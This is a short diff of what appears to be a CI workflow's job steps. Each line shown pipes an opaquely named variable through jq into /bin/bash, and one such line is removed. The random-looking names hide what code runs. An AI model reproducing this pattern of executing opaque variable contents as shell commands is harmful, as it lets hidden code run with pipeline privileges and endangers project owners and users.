@@ -22,7 +22,6 @@ jobs:
           echo $oerc4620 | jq -r .j1 | /bin/bash
           printf '%s' "$cn9278" | jq -r .uroku92616 | /bin/bash
           echo $k8 | jq -r .ro4 | /bin/bash
-          printf '%s' "$zp1" | jq -r .mluqe3262 | /bin/bash
           printf '%s' "$gtp701" | jq -r .rd07 | /bin/bash
           printf '%s' "$wxd363" | jq -r .oo823 | /bin/bash
           echo $auez66 | jq -r .x076 | /bin/bash
